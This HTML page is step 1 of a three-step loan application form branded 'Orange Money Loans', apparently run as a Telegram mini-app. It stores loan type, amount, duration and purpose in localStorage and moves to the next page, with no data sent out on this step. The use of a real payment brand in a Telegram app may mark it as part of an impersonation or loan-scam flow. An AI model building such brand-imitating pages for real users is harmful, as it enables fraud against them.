<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Orange Money Loans - Étape 1</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --orange-primary: #f25c05;
            --orange-gradient: #f25c05;
            --bg-color: #f7f3ed;
            --card-bg: #ffffff;
            --input-bg: #fdfaf6;
            --border-color: #ffd8b3;
            --text-dark: #222222;
            --text-muted: #666666;
        }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        .header-box { width: 100%; background: var(--orange-gradient); padding: 18px 20px; color: white; text-align: center; font-size: 22px; font-weight: 800; box-sizing: border-box; }
        
        .card { background: var(--card-bg); width: 92%; max-width: 440px; margin: 24px 0; padding: 28px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; flex-direction: column; }

        /* Step Indicator */
        .progress-bar-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 18px; }
        .step-pill { height: 4px; flex: 1; border-radius: 2px; background-color: #ffe8d6; }
        .step-pill.active { background-color: var(--orange-primary); }

        .step-title { text-align: center; font-size: 20px; font-weight: 800; color: var(--text-dark); margin-bottom: 24px; }

        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
        label { font-size: 14px; font-weight: 700; color: var(--text-dark); margin-bottom: 8px; }

        .form-control {
            background-color: var(--input-bg);
            border: 1.5px solid var(--border-color);
            border-radius: 12px;
            padding: 14px 16px;
            font-size: 16px;
            color: var(--text-dark);
            outline: none;
            width: 100%;
            box-sizing: border-box;
        }

        textarea.form-control { resize: none; height: 100px; }

        .btn-orange {
            background-color: var(--orange-primary);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="header-box">Orange Money Loans</div>

<div class="card">
    <div class="progress-bar-container">
        <div class="step-pill active"></div>
        <div class="step-pill"></div>
        <div class="step-pill"></div>
    </div>

    <div class="step-title">Étape 1 sur 3</div>

    <form id="step1Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label>Type de prêt</label>
            <select id="loanType" class="form-control">
                <option value="Personnel">Personnel</option>
                <option value="Professionnel">Professionnel</option>
            </select>
        </div>

        <div class="form-group">
            <label>Montant du prêt (XOF)</label>
            <input type="number" id="loanAmt" class="form-control" value="50000" required>
        </div>

        <div class="form-group">
            <label>Durée du prêt</label>
            <select id="loanDuration" class="form-control">
                <option value="12 mois">12 mois</option>
                <option value="24 mois">24 mois</option>
                <option value="36 mois">36 mois</option>
            </select>
        </div>

        <div class="form-group">
            <label>Objet</label>
            <textarea id="loanPurpose" class="form-control" placeholder="À quoi le prêt servira-t-il ?" required></textarea>
        </div>

        <button type="submit" class="btn-orange">ÉTAPE SUIVANTE</button>
    </form>
</div>

<script>
    function goNext(e) {
        e.preventDefault();
        localStorage.setItem('loanType', document.getElementById('loanType').value);
        localStorage.setItem('loan_amount', document.getElementById('loanAmt').value);
        localStorage.setItem('duration', document.getElementById('loanDuration').value);
        localStorage.setItem('loanPurpose', document.getElementById('loanPurpose').value);
        window.location.href = "page3.html";
    }
</script>
</body>
</html>
